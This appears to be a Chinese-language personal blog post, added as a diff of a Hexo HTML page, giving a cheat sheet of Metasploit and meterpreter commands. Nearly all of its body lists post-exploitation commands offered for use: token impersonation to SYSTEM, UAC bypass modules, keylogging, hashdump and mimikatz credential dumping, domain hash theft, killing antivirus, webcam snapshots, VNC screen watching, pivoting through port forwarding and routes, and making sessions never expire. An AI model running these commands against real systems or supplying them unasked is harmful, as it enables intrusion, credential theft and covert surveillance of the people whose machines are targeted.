@@ -1,0 +1,472 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="0ldcat">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="介绍 meatasploit有很多模块，一共分为七类。  12345671 exploits 漏洞利用模块，这个模块通常是用于对某些有可能存在漏洞的目标进行漏洞利用。2 payloads 攻击载荷，exploit成功之后就会执行payload，这段payload可以是反弹代码，可以是添加用户的代码。3 auxiliary 辅助模块，该模块是用于辅助渗透的，比如端口扫描、存活探测、暴力破解。4 po">
+<meta property="og:type" content="article">
+<meta property="og:title" content="msf介绍以及技巧（简单介绍）">
+<meta property="og:url" content="http://example.com/2025/01/25/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-1/index.html">
+<meta property="og:site_name" content="0ldcat_blog">
+<meta property="og:description" content="介绍 meatasploit有很多模块，一共分为七类。  12345671 exploits 漏洞利用模块，这个模块通常是用于对某些有可能存在漏洞的目标进行漏洞利用。2 payloads 攻击载荷，exploit成功之后就会执行payload，这段payload可以是反弹代码，可以是添加用户的代码。3 auxiliary 辅助模块，该模块是用于辅助渗透的，比如端口扫描、存活探测、暴力破解。4 po">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/01/25/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-1/image-20250125221747904.png">
+<meta property="og:image" content="http://example.com/2025/01/25/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-1/image-20250125221633705.png">
+<meta property="og:image" content="http://example.com/2025/01/25/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-1/image-20250125221940615.png">
+<meta property="og:image" content="http://example.com/2025/01/25/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-1/image-20250127112115383.png">
+<meta property="og:image" content="http://example.com/2025/01/25/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-1/image-20250127112219796.png">
+<meta property="og:image" content="http://example.com/2025/01/25/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-1/image-20250127112352418.png">
+<meta property="article:published_time" content="2025-01-25T14:11:41.000Z">
+<meta property="article:modified_time" content="2025-01-27T03:25:05.184Z">
+<meta property="article:author" content="0ldcat">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2025/01/25/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-1/image-20250125221747904.png">
+  
+  
+  <title>msf介绍以及技巧（简单介绍） - 0ldcat_blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.13","typing":{"enable":true,"typeSpeed":70,"cursorChar":"😒","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>闲言碎语</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="msf介绍以及技巧（简单介绍）">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2025-01-25 22:11" pubdate>
+        2025年1月25日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      5.8k 个字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      49 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">msf介绍以及技巧（简单介绍）</h1>
+            
+            <div class="markdown-body">
+              <h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p><img src="/2025/01/25/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-1/image-20250125221747904.png" srcset="/img/loading.gif" lazyload alt="image-20250125221747904"></p>
+<p>meatasploit有很多模块，一共分为七类。</p>
+<p><img src="/2025/01/25/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-1/image-20250125221633705.png" srcset="/img/loading.gif" lazyload alt="image-20250125221633705"></p>
+<figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>exploits 漏洞利用模块，这个模块通常是用于对某些有可能存在漏洞的目标进行漏洞利用。<br><span class="hljs-symbol">2 </span>payloads 攻击载荷，exploit成功之后就会执行payload，这段payload可以是反弹代码，可以是添加用户的代码。<br><span class="hljs-symbol">3 </span>auxiliary 辅助模块，该模块是用于辅助渗透的，比如端口扫描、存活探测、暴力破解。<br><span class="hljs-symbol">4 </span>post 后渗透模块，该模块一般用于内网渗透。<br><span class="hljs-symbol">5 </span>encoders 编码器模块，对payload进行编码加密，可绕过部分杀软软件。<br><span class="hljs-symbol">6 </span>evasion 躲避模块，该模块分类下只有<span class="hljs-number">4</span>个，都是为了躲避微软的限制或者是杀软的，免杀效果很一般。<br><span class="hljs-symbol">7 </span>nops 空指令模块，不知道<br></code></pre></div></td></tr></table></figure>
+
+<h1 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h1><figure class="highlight scss"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs scss">&gt;&gt; msf5 <span class="hljs-built_in">exploit</span>(multi/handler) &gt; set SessionCommunicationTimeout <span class="hljs-number">0</span>  <span class="hljs-comment">//默认情况下，如果一个会话将在5分钟（300秒）没有任何活动，那么它会被杀死,为防止此情况可将此项修改为0</span><br><br>&gt;&gt; msf5 <span class="hljs-built_in">exploit</span>(multi/handler) &gt; set SessionExpirationTimeout <span class="hljs-number">0</span> <span class="hljs-comment">//默认情况下，一个星期（604800秒）后，会话将被强制关闭,修改为0可永久不会被关闭</span><br><br><br></code></pre></div></td></tr></table></figure>
+
+<p><img src="/2025/01/25/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-1/image-20250125221940615.png" srcset="/img/loading.gif" lazyload alt="image-20250125221940615"></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm">加载模块<br>use name<br>查看网络配置<br>ifconfig<br>获取进程列表<br>ps<br>查看所有exploit<br><span class="hljs-keyword">show </span>exploits<br>查看所有payload<br><span class="hljs-keyword">show </span>payloads<br>查看所有auxiliary<br><span class="hljs-keyword">show </span>auxiliary<br>展示模块详细信息<br>info<br>查找模块<br>search name<br>查看当前运行的模块<br><span class="hljs-keyword">jobs</span><br><span class="hljs-keyword"></span>重启目标机器<br>reboot<br>关闭目标机器<br><span class="hljs-keyword">shutdown</span><br><span class="hljs-keyword"></span>获取交互<span class="hljs-keyword">shell</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">shell</span><br><span class="hljs-keyword"></span>当前meterpreter到后台<span class="hljs-keyword">background</span><br><span class="hljs-keyword"></span>离开msf<br>quit<br><br><br></code></pre></div></td></tr></table></figure>
+
+<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a><strong>端口转发</strong></h2><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">portfwd add -l <span class="hljs-number">6666</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">3389</span> -<span class="hljs-attribute">r</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.2</span><br><br>常用参数：<br>	-l：本地监听端口<br>	-<span class="hljs-attribute">r</span>：内网目标的ip<br>	-<span class="hljs-selector-tag">p</span>：内网目标的端口<br><br></code></pre></div></td></tr></table></figure>
+
+<h2 id="设置Socks代理"><a href="#设置Socks代理" class="headerlink" title="设置Socks代理"></a><strong>设置<strong><strong>Socks</strong></strong>代理</strong></h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">Socks4a代理<br>    use auxiliary/server/socks4a <span class="hljs-built_in">set</span> srvhost 127.0.0.1<br>    <span class="hljs-built_in">set</span> srvport 1080<br>    <span class="hljs-built_in">run</span><br>Socks5代理<br>	use auxiliary/server/socks5 <span class="hljs-built_in">set</span> USERNAME root<br>    <span class="hljs-built_in">set</span> PASSWORD Password@<br>    run<br></code></pre></div></td></tr></table></figure>
+
+<h2 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a><strong>添加路由</strong></h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">获取网段信息<br><span class="hljs-built_in">run</span> get_local_subnets<br>查看帮助<br><span class="hljs-built_in">run</span> autoroute –h<br>添加到目标环境网络<br><span class="hljs-built_in">run</span> autoroute -s 192.168.0.1/24<br>打印添加的路由<br><span class="hljs-built_in">run</span> autoroute –p<br>删除路由<br><span class="hljs-built_in">run</span> autoroute -d -s 192.168.0.1/24<br></code></pre></div></td></tr></table></figure>
+
+<h2 id="execute-执行文件"><a href="#execute-执行文件" class="headerlink" title="execute****执行文件"></a><strong>execute****执行文件</strong></h2><figure class="highlight smali"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs smali">在目标机中执行文件<span class="hljs-built_in"></span><br><span class="hljs-built_in">execute</span><br><span class="hljs-built_in"></span>创建新进程cmd.exe，-H不可见，-i交互execute -H -i -f cmd.exe<br>-f：指定可执行文件<br>-H：创建一个隐藏进程<br>-a：传递给命令的参数<br>-i：跟进程进行交互<br>-m：从内存中执行<br>-t： 使用当前伪造的线程令牌运行进程<br>-s： 在给定会话中执行进程<br></code></pre></div></td></tr></table></figure>
+
+<h2 id="migrate-转移进程"><a href="#migrate-转移进程" class="headerlink" title="migrate****转移进程"></a><strong>migrate****转移进程</strong></h2><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">获取当前进程PID<br>getpid<br>获取进程列表<br><span class="hljs-built_in">ps</span><br>转移进程<br>migrate PID<br>杀死进程<br><span class="hljs-built_in">kill</span> PID<br>自动进程迁移<br>run post/windows/manage/migrate 监听设置自动转移进程<br><span class="hljs-built_in">set</span> autorunscript migrate <span class="hljs-operator">-f</span><br><br></code></pre></div></td></tr></table></figure>
+
+<h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a><strong>令牌窃取</strong></h2><figure class="highlight smali"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs smali">使用模块<br>use incognito<br>查看可用token<br>list_tokens -u<br>假冒SYSTEM权限<br>impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27;利用假冒身份执行命令<span class="hljs-built_in"></span><br><span class="hljs-built_in">execute </span>-f cmd.exe -i –t<br>或者直接shell即可<br>返回原始权限<br>rev2self<br></code></pre></div></td></tr></table></figure>
+
+<h2 id="提权相关"><a href="#提权相关" class="headerlink" title="提权相关"></a><strong>提权相关</strong></h2><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">加载特权提升扩展模块<br><span class="hljs-keyword">use</span> priv<br>获取更多的特权<br>getprivs<br>查看补丁信息<br><span class="hljs-keyword">run</span> <span class="hljs-keyword">post</span>/windows/gather/enum_patches<br>可利用exp提权检测<br><span class="hljs-keyword">use</span> <span class="hljs-keyword">post</span>/multi/recon/local_exploit_suggester<br>系统服务权限配置错误<br><span class="hljs-keyword">use</span> exploit/windows/<span class="hljs-keyword">local</span>/service_permissions<br>注册表键配置错误提取<br><span class="hljs-keyword">use</span> exploit/windows/<span class="hljs-keyword">local</span>/always_install_elevated 可信任服务路径<br><span class="hljs-keyword">use</span> exploit/windows/<span class="hljs-keyword">local</span>/trusted_service_path<br></code></pre></div></td></tr></table></figure>
+
+<h2 id="bypassuac"><a href="#bypassuac" class="headerlink" title="bypassuac"></a><strong>bypassuac</strong></h2><figure class="highlight fortran"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs fortran"><span class="hljs-keyword">use</span> exploit/windows/<span class="hljs-keyword">local</span>/bypassuac<br><span class="hljs-keyword">use</span> exploit/windows/<span class="hljs-keyword">local</span>/bypassuac_injection <span class="hljs-keyword">use</span> windows/<span class="hljs-keyword">local</span>/bypassuac_vbs<br><span class="hljs-keyword">use</span> windows/<span class="hljs-keyword">local</span>/ask<br></code></pre></div></td></tr></table></figure>
+
+<h2 id="键盘鼠标设置"><a href="#键盘鼠标设置" class="headerlink" title="键盘鼠标设置"></a><strong>键盘鼠标设置</strong></h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">禁用鼠标<br>uictl <span class="hljs-built_in">disable</span> mouse<br>禁用键盘<br>uictl <span class="hljs-built_in">disable</span> keyboard 启用鼠标<br>uictl <span class="hljs-built_in">enable</span> mouse<br>启用键盘<br>uictl <span class="hljs-built_in">enable</span> keyboard <br>键盘记录<br>    #开始键盘记录<br>    keyscan_start<br>    #导出记录数据<br>	keyscan_dump<br>	#结束键盘记录<br>	keyscan_stop<br><br></code></pre></div></td></tr></table></figure>
+
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a><strong>信息搜集</strong></h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">查看当前目录<br>pwd<br>getwd<br>查看目标主机信息<br>sysinfo<br>检查目标机器闲置时间<br>idletime<br>获取代理信息<br>getproxy<br>查看目标主机是否运行在虚拟机上<br><span class="hljs-built_in">run</span> checkvm<br><span class="hljs-built_in">run</span> post/windows/gather/checkvm<br>获取主机安装软件、补丁<br><span class="hljs-built_in">run</span> post/windows/gather/enum_applications<br>获取目标主机环境变量<br><span class="hljs-built_in">run</span> post/multi/gather/env<br>获取IE缓存<br><span class="hljs-built_in">run</span> post/windows/gather/enum_ie<br>获取Chrome缓存<br><span class="hljs-built_in">run</span> post/windows/gather/enum_chrome<br>获取Firefox缓存<br><span class="hljs-built_in">run</span> post/windows/gather/enum_firefox<br>列举当前登录的用户<br><span class="hljs-built_in">run</span> post/windows/gather/enum_logged_on_users 查找域控<br><span class="hljs-built_in">run</span> post/windows/gather/enum_domain<br>Windows凭证搜索<br><span class="hljs-built_in">run</span> post/windows/gather/enum_unattend<br>获取办公文档<br><span class="hljs-built_in">run</span> post/windows/gather/dumplinks<br>获取目标常见信息并保存到本地<br><span class="hljs-built_in">run</span> scraper<br>屏幕截图<br>screenshot<br></code></pre></div></td></tr></table></figure>
+
+<h2 id="密码获取"><a href="#密码获取" class="headerlink" title="密码获取"></a><strong>密码获取</strong></h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">抓取自动登录的用户名和密码<br><span class="hljs-built_in">run</span> post/windows/gather/credentials/windows_autologin hashdump<br><span class="hljs-built_in">run</span> post/windows/gather/smart_hashdump<br><br>mimikatz<br>	加载<br>    load mimikatz<br>    获取hash值<br>    msv<br>    获取明文<br>    Kerberos<br>    获取系统账户信息wdigest<br>获取域散列值<br>	#使用psexec_ntdsgrab模块<br>    use auxiliary/admin/smb/psexec_ntdsgrab <span class="hljs-built_in">set</span> RHOST<br>    <span class="hljs-built_in">set</span> SMBDomain<br>    <span class="hljs-built_in">set</span> SMBUser<br>    <span class="hljs-built_in">set</span> SMBPass<br>    #基于meterpreter会话<br>	use windows/gather/credentials/domain_hashdump <span class="hljs-built_in">set</span> session ID<br></code></pre></div></td></tr></table></figure>
+
+<h2 id="流量抓取"><a href="#流量抓取" class="headerlink" title="流量抓取"></a><strong>流量抓取</strong></h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">查看网卡信息<br><span class="hljs-built_in">run</span> packetrecorder -L<br>查看流量<br><span class="hljs-built_in">run</span> packetrecorder -i &lt;网卡ID&gt; <br></code></pre></div></td></tr></table></figure>
+
+<h2 id="端口扫描、主机发现"><a href="#端口扫描、主机发现" class="headerlink" title="端口扫描、主机发现"></a><strong>端口扫描、主机发现</strong></h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">使用arp发现主机<br><span class="hljs-built_in">run</span> post/windows/gather/arp_scanner <span class="hljs-attribute">RHOSTS</span>=192.168.159.0/24<br>扫描tcp端口<br><span class="hljs-built_in">run</span> auxiliary/scanner/portscan/tcp <span class="hljs-attribute">RHOSTS</span>=192.168.159.144 <span class="hljs-attribute">PORTS</span>=3389<br></code></pre></div></td></tr></table></figure>
+
+<h2 id="防火墙、杀软"><a href="#防火墙、杀软" class="headerlink" title="防火墙、杀软"></a><strong>防火墙、杀软</strong></h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">关闭杀软<br><span class="hljs-built_in">run</span> killav<br>查看防火墙状态<br><span class="hljs-built_in">run</span> getcountermeasure<br><br>在shell中使用<br>netsh<span class="hljs-built_in"> firewall </span>show opmode<br></code></pre></div></td></tr></table></figure>
+
+<h2 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a><strong>PowerShell</strong></h2><figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc">加载脚本模块<br>powershell<span class="hljs-emphasis">_import /root/Desktop/HostRecon.ps1 执行加载的脚本</span><br><span class="hljs-emphasis">powershell_</span>execute Invoke-HostRecon<br> <br></code></pre></div></td></tr></table></figure>
+
+<h2 id="Hash-传递"><a href="#Hash-传递" class="headerlink" title="Hash****传递"></a><strong>Hash****传递</strong></h2><figure class="highlight actionscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs actionscript"><span class="hljs-keyword">use</span> exploit/windows/smb/psexec<br></code></pre></div></td></tr></table></figure>
+
+<h2 id="摄像头、屏幕"><a href="#摄像头、屏幕" class="headerlink" title="摄像头、屏幕"></a><strong>摄像头、屏幕</strong></h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">查看摄像头信息webcam_list<br>使用摄像头拍照webcam_snap 屏幕监视<br><span class="hljs-built_in">run</span> vnc<br></code></pre></div></td></tr></table></figure>
+
